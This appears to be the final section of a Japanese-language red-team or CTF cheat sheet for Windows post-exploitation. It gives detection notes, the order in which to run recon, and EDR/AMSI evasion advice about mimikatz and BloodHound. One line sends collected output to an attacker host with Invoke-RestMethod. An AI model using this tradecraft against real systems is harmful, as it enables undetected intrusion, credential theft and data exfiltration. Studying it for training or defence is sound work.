検知 / detection

検知 / detection
  • LSASS への Handle 取得は Sysmon EID 10 (ProcessAccess) で GrantedAccess=0x1010/0x1410 等のパターン検知
  • ETW-Ti (Microsoft-Windows-Threat-Intelligence) は Kernel 側で発火、userland patch 無効

09Order & Key Takeaways実行順序と要点

Execution order

  1. Section 01 は侵入後 30 秒以内に完了 — whoami /all だけは必ず即時実行
  2. AMSI bypass 前の偵察は cmd.exe 優先 — PowerShell コマンドは AMSI / ScriptBlockLogging で全捕捉されうる
  3. Section 03 完了前に攻撃ペイロードを投入しない — 防御層を知らずに動くと EDR 即検知
  4. BloodHound (Section 06) は侵害ホスト数が増えてから — 単一ホストからの全ドメイン収集は明確な signature
  5. Section 07 は権限昇格後に実施 — Standard ユーザで mimikatz は無意味
  6. 新規ホスト侵害ごとに Section 01→03 を再実行 — 各ホストで防御プロファイルが異なる

ノイズ最小化

  • whoami /all 1 コマンドで権限・グループ・整合性・SID が一括取得
  • systeminfo は 1 回で OS / Arch / Patch / Domain が揃う
  • PowerShell 実行時は -NoProfile -NonInteractive -ExecutionPolicy Bypass でプロファイルロード抑制
  • 大量列挙時は -ErrorAction SilentlyContinue でエラーログを汚さない
  • 結果はターゲット側に書かず attacker 側に転送: Invoke-RestMethod -Uri http://<LHOST> -Method Post -Body $output
要点 / key takeaways
  • whoami /all は侵入直後の絶対実行コマンド、これだけで権限・整合性・特権の 3 要素が判明し後続の分岐が決まる
  • アーキ判定 (Is64BitProcess) はペイロード生成の前提、確認せず -f csharp で shellcode 生成すると 32bit 環境で確実に失敗
  • Section 03 (防御検出) を省略すると EDR に即捕捉される、ペイロード投入前に AV/EDR/AMSI/CLM/AppLocker の 5 項目は必ず確認
  • PowerShell は AMSI / ScriptBlockLogging で監視されている前提、初期偵察は cmd.exe + reg/sc/wmic を優先する方が安全
  • TamperProtection と Credential Guard の有無は攻略時間を大きく左右する、Section 03 で確実に判定
  • 各ホスト侵害時に Section 01→03 を再実行することが flag 取得の安定性を担保、前ホストの環境前提を引き継いでも次では通用しない
  • BloodHound (Section 06) は SharpHound の CollectionMethod を DCOnly から始めることで初動の検知リスクを最小化
